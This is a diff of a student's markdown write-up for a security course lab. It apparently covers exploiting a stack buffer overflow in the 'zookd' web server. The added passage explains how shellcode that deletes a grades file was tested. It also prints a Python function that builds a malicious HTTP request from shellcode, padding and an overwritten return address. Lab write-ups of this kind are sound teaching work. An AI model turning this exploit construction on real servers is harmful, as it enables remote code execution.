@@ -48,7 +48,7 @@ As a tool to inspect the program I used `gdb`, a debugger for C/C++ already pres
 I started by launching gdb on the program `zookd-exstack`
 
 ```sh
-./clean-env.sh gdb ./zookd-exstack
+$ ./clean-env.sh gdb ./zookd-exstack
 ```
 and setting a breakpoint after the call of the function of interest
 ```sh
@@ -126,6 +126,44 @@ For the second exercise is required to not only overwrite the stack with random 
 The exploit here is similar to the first one since we are trying to exploit the same vulnerability, with the additional shellcode injeted in the payload.
 The challenging part of this second exercise is to write the shellcode direclty in x64 ASM instructions. Fortunately the source https://thesquareplanet.com/blog/smashing-the-stack-21st-century/ is a well explained blogpost where the shellcode explained is similar to the one we have to write, except for the syscall we need to use and the registry loading.
 
+Here the steps to generate the new exploit were:
+1. Edit `shellcode.S`, and test locally with 
+```sh
+$ touch /home/student/grades.txt
+$ make
+$ ./run-shellcode shellcode.bin
+```
+and to verify that it effectively removed the file `grades.txt`
+
+2. Implement the shellcode into the previous exploit script to take into consideration its position on the stack and the remaining padding space, other than overwrite the return instruction pointer with the start of the shellcode
+
+```python
+padding_len = stack_retaddr - stack_buffer - 1 # Subtract 1 because the server expects a '/' at the start of reqpath in http_request_line
+
+def build_exploit(shellcode: bytes) -> bytes:
+    target_addr_jmp = stack_buffer + 1
+
+    payload = shellcode
+    payload += b"A" * (padding_len - len(shellcode))
+    payload += struct.pack("<Q", target_addr_jmp) # returns the 8-byte binary encoding of the 64-bit integer target_addr_jmp
+    
+    encoded_payload = urllib.parse.quote_from_bytes(payload).encode('ascii')
+    
+    req = b"GET /" + encoded_payload + b" HTTP/1.0\r\n\r\n"
+    
+    return req
+
+```
+
+and this is the result after the payload injection in the running process:
+![Buffer contains the shellcode](imgs/ex2-injected-shellcode.png)
+
+Which completes the second exercise of the lab, as shown in the following image where is visible that the file `grades.txt` have been deleted.
+![Pass of exercise 2](imgs/ex2-pass.png)
+
+Both the complete shellcode and exploit files are available in the code folder in this repository.
+
+
 
 ## Sources
 
@@ -133,4 +171,3 @@ The challenging part of this second exercise is to write the shellcode direclty 
 - Smashing the stack in the 21st century - [thesquareplanet.com](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/)
 - Smashing the stack for fun and profit - [phrack.org](https://phrack.org/issues/49/14#article)
 - Stack frame layout on x86-x64 - [eli.thegreenplace.net](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)
-- Syscall x86-64 codes - [chromium.googlesource.com](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit)
